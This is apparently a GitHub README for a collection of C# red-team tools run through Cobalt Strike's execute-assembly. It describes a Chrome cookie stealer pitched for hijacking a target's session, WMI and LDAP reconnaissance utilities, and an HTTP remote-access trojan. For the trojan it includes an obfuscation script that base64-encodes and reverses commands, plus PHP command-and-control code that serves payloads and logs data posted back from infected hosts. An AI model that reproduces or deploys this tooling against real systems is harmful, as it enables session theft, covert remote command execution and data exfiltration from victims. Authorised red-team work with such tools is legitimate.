# RedTeamCSharpScripts
C# Script used for Red Team. These binaries can be used by Cobalt Strike execute-assembly or as standalone executable. 


# LDAP utility

The utility has been renamed to AdHuntTool and moved to its own repo [https://github.com/Mr-Un1k0d3r/ADHuntTool](https://github.com/Mr-Un1k0d3r/ADHuntTool)

### The CheckManaged feature

Active Directory support the following two attributes `managedobjects` and `managedby`. These attributes can be used to assign a manager to an object. It can be a user managing a computer. There is a GPO that can be used to grant local admin to managedobjects owner. The user will not be listed as a local admin by default by the correlation between `managedby` and `managedobjects` can identify users that managed computers.

The `CheckManaged` feature first confirm the presence of the GPO in question by looking at the SYSVOL policies present on the DC. If the `groups.xml` is present, it dump all the users with a `managedobjects` attribute and the computers with a `managedby` attribute.

# Cookies Monster

Fetch Chrome cookie in plaintext. Perfect to steal a target session cookie through execute-assembly

```
Usage: CookiesMonster.exe filter
```

The filter argument is optional. If not specified it will dump all the cookies. Since the cookies are encrypted using ProtectedMemory Windows APIs you need to have access to the current user context to be able to generate the proper decryption key. 

The binary need to be compiled statically to include the System.Data.SQLite dll.

# WMI Utility

ListService         List all the services
Query               Args (query, columns) wmiutility.exe Query "Select * From Win32_CommandLineAccess" "Name,Description"

ListRemoteProcess   Return a list of running process on the target host
ListRemoteService   Return a list of all the services on the target host
Get-EventForUser    Search for 4624 events targeting specific user
RemoteQuery         Args (query, columns) 
Get-Av              Return a list of potential security product

EX:
wmiutility.exe ListRemoteProcess <ComputerName> <Username> <Password>
wmiutility.exe ListRemoteService <ComputerName> <Username> <Password>
wmiutility.exe Get-EventForUser <samAccountname> <DomainController> <Username> <Password>
wmiutility.exe Get-EventForUser <samAccountname> all <Username> <Password>
wmiutility.exe RemoteQuery "Select * From Win32_CommandLineAccess" "Name,Description" <ComputerName> <Username> <Password>
```

# enumerateuser.cs

List all the users samaccountname & mail

```
execute-assembly C:\enumerateuser.exe domain
```

# ldapquery.cs

Perform custom ldap queries

```
execute-assembly C:\enumerateuser.exe ringzer0team "(&(objectCategory=User)(samaccountname=Mr.Un1k0d3r))" samaccountname,mail

Querying LDAP://ringzer0team
Querying: (&(objectCategory=User)(samaccountname=Mr.Un1k0d3r))
Extracting: samaccountname,mail
Mr.Un1k0d3r,Mr.Un1k0d3r@corp.com,

# simple-http-rat.cs

A simple RAT that execute command over HTTP. The code is calling back every 10 seconds and will execute the data present on the callback URL.

`rat.exe callbackurl`

The data is obfuscated using the following python trick

```
$ python -c 'import base64; print base64.b64encode("cmd.exe /c whoami")[::-1]'
=kWbh9Ga3ByYvASZ4VmLk12Y
```

The file creation can also be automated using the following script

```
import base64
import sys
import os

path = sys.argv[1]
cmd = sys.argv[2]

if os.path.exists(path):
        os.remove(path)
        
open(path, "w+").write(base64.b64encode(cmd)[::-1])
print "Command added"
```

```
update.py /var/www/html/callback.html "whoami"
```

For the post back RAT the following PHP code can be used to capture the data

```
<?php
$request = (object)array();

if($_SERVER['REQUEST_METHOD'] === "POST") {
        $request->data = file_get_contents("php://input");
        $request->ip = $_SERVER["REMOTE_ADDR"];
        $request->time = date("r");

        $data = str_replace("!)(*&#:<]", "A", $request->data);
        $decoded = base64_decode($data);

        file_put_contents("/tmp/output.txt", "[" . $request->time . "](" . $request->ip . "): " . $decoded . "\r\n", FILE_APPEND);
} else {
        echo file_get_contents("/tmp/payload.txt");
}
?>
```

# set.cs (set.exe)

C# equivalent of Windows set command that does not required to spawn cmd.exe

```

PROCESSOR_ARCHITEW6432=AMD64
DriverData=C:\Windows\System32\Drivers\DriverData
```
